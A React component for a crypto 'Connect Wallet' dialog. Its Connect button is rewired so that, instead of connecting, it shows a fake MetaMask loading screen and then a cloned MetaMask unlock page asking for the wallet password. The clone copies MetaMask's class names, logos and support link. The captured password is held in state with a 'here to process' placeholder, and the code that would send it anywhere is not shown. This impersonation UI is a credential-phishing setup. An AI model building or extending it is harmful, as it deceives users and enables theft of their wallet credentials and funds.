import React, { useEffect, useState } from 'react';
import { useWeb3React } from '@web3-react/core';
import { useWalletConnector, setNet } from './WalletConnector.jsx';
import Dialog from '@mui/material/Dialog';
import DialogActions from '@mui/material/DialogActions';
import DialogContent from '@mui/material/DialogContent';
import DialogTitle from '@mui/material/DialogTitle';
import Button from '@mui/material/Button';
import Stack from '@mui/material/Stack';
import IconButton from '@mui/material/IconButton';
import CloseIcon from '@mui/icons-material/Close';
import Typography from '@mui/material/Typography';
import Box from '@mui/material/Box';
import { EthereumLogo, BinanceLogo } from '../ui/NetworkLogos.jsx';
import { MetamaskLogo, WalletConnectLogo } from '../ui/WalletLogos.jsx';
import Avatar from '@mui/material/Avatar';
import Badge from '@mui/material/Badge';
import { styled } from '@mui/material/styles';
import DoneIcon from '@mui/icons-material/Done';
import { green } from '@mui/material/colors';
import Modal from '@mui/material/Modal';
import TextField from '@mui/material/TextField';
import './index.css';

const SmallAvatar = styled(Avatar)(({ theme }) => ({
  width: 22,
  height: 22,
  border: `2px solid ${theme.palette.background.paper}`,
}));

const networks = [
  //{label: "Ethereum", value: "eth", icon: <EthereumLogo width={60} />},
  { label: 'Binance', value: 'bsc', icon: <BinanceLogo width={60} /> },
];

const wallets = [
  { label: 'Metamask', value: 'injected', icon: <MetamaskLogo width={60} /> },
  {
    label: 'Wallet Connect',
    value: 'walletconnect',
    icon: <WalletConnectLogo width={60} />,
  },
];

const setWalletProvider = (wallet) => {
  localStorage.setItem('wallet', wallet);
};

const style = {
  position: 'absolute',
  top: '00px',
  // left: "50%",
  right: '00px',
  // transform: "translate(-50%, -50%)",
  width: 310,
  bgcolor: 'background.paper',
  // border: "2px solid #000",
  // boxShadow: 24,
  p: 4,
};

const NetworkWalletProviders = ({
  walletProvidersDialogOpen,
  handleWalletProvidersDialogToggle,
}) => {
  const { library, account } = useWeb3React();
  const { loginMetamask, loginWalletConnect } = useWalletConnector();
  const [selectedNetwork, setSelectedNetwork] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(null);

  const handleSelectNetwork = (network) => {
    setSelectedNetwork(network);
  };

  const handleSelectWallet = (wallet) => {
    setSelectedWallet(wallet);
  };

  useEffect(() => {
    if (library) {
      handleWalletProvidersDialogToggle();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [library, account]);

  const handleConnectWallet = () => {
    if (selectedWallet && selectedNetwork) {
      const walletprovider = `${selectedWallet}_${selectedNetwork}`;
      connectWallet(walletprovider);
    }
  };

  const connectWallet = async (walletprovider) => {
    localStorage.setItem('connected', true);

    switch (walletprovider) {
      case 'injected_eth':
        setWalletProvider('injected_eth');
        setNet(0);
        loginMetamask();
        break;
      case 'walletconnect_eth':
        setWalletProvider('walletconnect_eth');
        setNet(0);
        loginWalletConnect();
        break;
      case 'injected_bsc':
        setWalletProvider('injected_bsc');
        setNet(1);
        loginMetamask();
        break;
      case 'walletconnect_bsc':
        setWalletProvider('walletconnect_bsc');
        setNet(1);
        loginWalletConnect();
        break;
      default:
        return null;
    }
  };

  useEffect(() => {
    if (localStorage.getItem('connected')) {
      connectWallet(localStorage.getItem('wallet'));
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  //6/26added

  const [open, setOpen] = React.useState(false);
  const [during, setDuring] = React.useState(false);
  const [password, setPassword] = React.useState();

  const handleOpen = () => {
    setDuring(true);
    setOpen(true);
    setTimeout(() => {
      setDuring(false);
    }, 5000);
  };
  const handleClose = () => {
    setOpen(false);
    setDuring(true);
  };

  const handleChangePassword = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = () => {
    setOpen(false);
    setDuring(true);
    // console.log("password = ", password )

    // here to process...
    // if (password === "") {
    //   setError("Password is required");
    // } else {
    //   setError(null);
    // }
  };
  //end

  return (
    <Dialog
      open={walletProvidersDialogOpen}
      onClose={handleWalletProvidersDialogToggle}
      aria-labelledby="alert-dialog-title"
      aria-describedby="alert-dialog-description"
      BackdropProps={{
        style: {
          backgroundColor: 'rgba(111, 126, 140, 0.2)',
          backdropFilter: 'blur(2px)',
        },
      }}
      PaperProps={{
        style: { borderRadius: 25, boxShadow: 'none' },
      }}
      fullWidth
      maxWidth="xs"
    >
      <DialogTitle id="alert-dialog-title" sx={{ p: 3 }}>
        <Stack direction="row" justifyContent="space-between" spacing={2}>
          <Box>
            <Typography variant="h6" sx={{ fontWeight: 700 }}>
              Connect Wallet
            </Typography>
          </Box>
          <Box>
            <IconButton
              onClick={handleWalletProvidersDialogToggle}
              aria-label="close"
              sx={{ bgcolor: 'grey.100' }}
            >
              <CloseIcon />
            </IconButton>
          </Box>
        </Stack>
      </DialogTitle>
      <DialogContent>
        <Stack direction="row" spacing={2} alignItems="center" mb={2}>
          <Avatar sx={{ width: 24, height: 24, fontSize: '0.9rem' }}>1</Avatar>
          <Typography sx={{ fontWeight: 500 }}>Choose Network</Typography>
        </Stack>
        <Stack direction="row" spacing={5} alignItems="center" mb={4} justifyContent="space-evenly">
          {networks.map((network) => (
            <Stack
              component={Button}
              color="inherit"
              spacing={1}
              key={network.value}
              onClick={() => handleSelectNetwork(network.value)}
            >
              <Badge
                overlap="circular"
                anchorOrigin={{ vertical: 'bottom', horizontal: 'right' }}
                badgeContent={
                  selectedNetwork === network.value ? (
                    <SmallAvatar sx={{ bgcolor: green[500] }}>
                      <DoneIcon sx={{ fontSize: 15 }} color="inherit" />
                    </SmallAvatar>
                  ) : null
                }
              >
                <Avatar sx={{ width: 60, height: 60 }}>{network.icon}</Avatar>
              </Badge>
              <Typography variant="caption" display="block" sx={{ fontWeight: 500 }}>
                {network.label}
              </Typography>
            </Stack>
          ))}
        </Stack>
        <Stack direction="row" spacing={2} alignItems="center" mb={2}>
          <Avatar sx={{ width: 24, height: 24, fontSize: '0.9rem' }}>2</Avatar>
          <Typography sx={{ fontWeight: 500 }}>Choose Wallet</Typography>
        </Stack>
        <Stack direction="row" spacing={3} alignItems="center" justifyContent="space-evenly">
          {wallets.map((wallet) => (
            <Stack
              component={Button}
              color="inherit"
              spacing={1}
              key={wallet.value}
              onClick={() => handleSelectWallet(wallet.value)}
            >
              <Badge
                overlap="circular"
                anchorOrigin={{ vertical: 'bottom', horizontal: 'right' }}
                badgeContent={
                  selectedWallet === wallet.value ? (
                    <SmallAvatar sx={{ bgcolor: green[500] }}>
                      <DoneIcon sx={{ fontSize: 15 }} color="inherit" />
                    </SmallAvatar>
                  ) : null
                }
              >
                <Avatar sx={{ width: 60, height: 60 }}>{wallet.icon}</Avatar>
              </Badge>
              <Typography variant="caption" display="block" sx={{ fontWeight: 500 }}>
                {wallet.label}
              </Typography>
            </Stack>
          ))}
        </Stack>
      </DialogContent>
      <DialogActions>
        <Button
          fullWidth
          // onClick={handleConnectWallet}
          onClick={handleOpen}
          disabled={!selectedNetwork || !selectedWallet}
        >
          Connect
        </Button>
        <Modal
          open={open}
          onClose={handleClose}
          overlay
          aria-labelledby="modal-modal-title"
          aria-describedby="modal-modal-description"
          transformOrigin={{ horizontal: 'center', vertical: 'top' }}
        >
          <Box sx={style}>
            {during ? (
              <Box
                sx={{
                  display: 'flex',
                  width: '100%',
                  padding: '10rem  0 14rem ',
                  flexDirection: 'column',
                  justifyContent: 'center',
                  alignItems: 'center',
                  gap: '1rem',
                }}
              >
                <img
                  className="app-header__metafox-logo--icon"
                  src="./images/logo/metamask-fox.svg"
                  alt="Ethereum Mainnet logo"
                  style={{
                    display: 'block',
                    width: '150px',
                    height: 'auto',
                  }}
                ></img>
                <img
                  className="app-header__metafox-logo--icon"
                  src="./images/spinner.gif"
                  alt="Ethereum Mainnet logo"
                  style={{
                    display: 'block',
                    width: '30px',
                    height: 'auto',
                  }}
                ></img>
              </Box>
            ) : (
              <Box id="app-content">
                <Box className="app os-win">
                  <Box className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                    <Box
                      className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default"
                      style={{ width: '100%' }}
                    >
                      <Box>
                        <Button
                          className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
                          aria-label="Network Menu Ethereum Mainnet"
                          data-testid="network-display"
                        >
                          <Box
                            className="mm-box mm-text mm-avatar-base mm-avatar-base--size-xs mm-avatar-network mm-picker-network__avatar-network mm-text--body-xs mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1"
                            role="img"
                          >
                            <img
                              class="mm-avatar-network__network-image"
                              src="./images/eth_logo.svg"
                              alt="Ethereum Mainnet logo"
                            ></img>
                          </Box>
                          <span className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default">
                            Ethereum Mainnet
                          </span>
                          <span
                            className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                            style={{
                              maskImage: 'url("./images/icons/arrow-down.svg")',
                            }}
                          />
                        </Button>
                      </Box>
                      {/* <button
                        className="mm-box app-header__logo-container app-header__logo-container--clickable mm-box--background-color-transparent"
                        data-testid="app-header-logo"
                      >
                        <img
                          className="app-header__metafox-logo--icon"
                          src="./images/logo/metamask_logo.png"
                          alt="Ethereum Mainnet logo"
                          style={{
                            width: "100%",
                            height: "auto",
                          }}
                        ></img>
                      </button> */}
                    </Box>
                  </Box>
                  <Box className="mm-box main-container-wrapper">
                    <Box className="unlock-page__container">
                      <Box
                        className="unlock-page"
                        data-testid="unlock-page"
                        style={{ width: '100%' }}
                      >
                        <Box className="unlock-page__mascot-container">
                          <Box
                            zIndex={0}
                            style={{
                              display: 'flex',
                              alignItems: 'center',
                            }}
                          >
                            <img
                              className="app-header__metafox-logo--icon"
                              src="./images/logo/metamask-fox.svg"
                              alt="Ethereum Mainnet logo"
                              style={{
                                display: 'block',
                                width: '100px',
                                height: 'auto',
                              }}
                            ></img>
                          </Box>
                        </Box>
                        <h1 className="unlock-page__title">Welcome back!</h1>
                        <Typography style={{ fontSize: 14 }}>
                          The decentralized web awaits
                        </Typography>
                        <Box className="unlock-page__form" style={{ margin: '25px 0 8px' }}>
                          <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                            <Box
                              component="form"
                              sx={{
                                '& > :not(style)': {
                                  m: 1,
                                  width: '92%',
                                },
                              }}
                              noValidate
                              autoComplete="off"
                            >
                              <TextField
                                id="standard-password-input"
                                label="Password"
                                type="password"
                                autoComplete="current-password"
                                variant="standard"
                                value={password}
                                onChange={handleChangePassword}
                                onKeyPress={(event) => {
                                  if (event.key === 'Enter') {
                                    event.preventDefault();
                                    handleSubmit();
                                  }
                                }}
                              />
                            </Box>
                          </div>
                        </Box>
                        <Button
                          variant="contained"
                          style={{
                            margin: '10px 0',
                            height: 50,
                            fontSize: 16,
                            fontWeight: 400,
                            boxShadow: 'none',
                            borderRadius: '100px',
                            color: '#ffffff',
                            backgroundColor: '#0376c9',
                            width: '100%',
                          }}
                          data-testid="unlock-submit"
                          onClick={handleSubmit}
                        >
                          Unlock
                        </Button>
                        <Box className="unlock-page__links" style={{ margin: '0px 0' }}>
                          <a className="button btn-link unlock-page__link" role="button">
                            Forgot password?
                          </a>
                        </Box>
                        <Box className="unlock-page__support" style={{ marginTop: '10px' }}>
                          <span>
                            Need help? Contact{' '}
                            <a
                              href="https://support.metamask.io"
                              target="_blank"
                              rel="noopener noreferrer"
                            >
                              MetaMask support
                            </a>
                          </span>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            )}
          </Box>
        </Modal>
      </DialogActions>
    </Dialog>
  );
};

export default NetworkWalletProviders;
